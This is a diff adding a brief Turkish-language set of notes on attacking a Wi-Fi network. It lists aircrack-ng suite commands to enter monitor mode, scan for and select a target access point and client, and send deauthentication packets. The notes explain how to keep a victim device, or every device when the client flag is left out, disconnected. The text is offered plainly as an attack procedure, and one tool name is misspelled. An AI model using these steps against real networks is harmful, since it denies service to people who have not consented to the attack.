@@ -1,0 +1,10 @@
+İlk önce saldırı yapacağımız modemin bilgilerini almalıyız
+
+airmon-ng start wlan0 -> monitor mod geçiş
+airodump-ng wlan0mon -> ağ bilgilerini toplayalım
+
+airodump-ng --channel 3 --bssid MACadresi wlan0mon -> saldırı yapılacak ağın bil ilerini toplayalım
+airplay-ng --deauth yollanacakPaketSayısı -a modemMAC -c hedefCihazMAC wlan0mon -> modemdeki hedef cihazı ağdan düşürmek için istek 
+paketleri yollarız ve ağdan düşer. ağdan düşmesi için yüksek sayı vermeliyiz ağdan kısa süreliğine kopması için düşük sayı vermeliyiz
+Eğer -c kısmını girmezsek cihaza değil ağa saldırı yapar
+
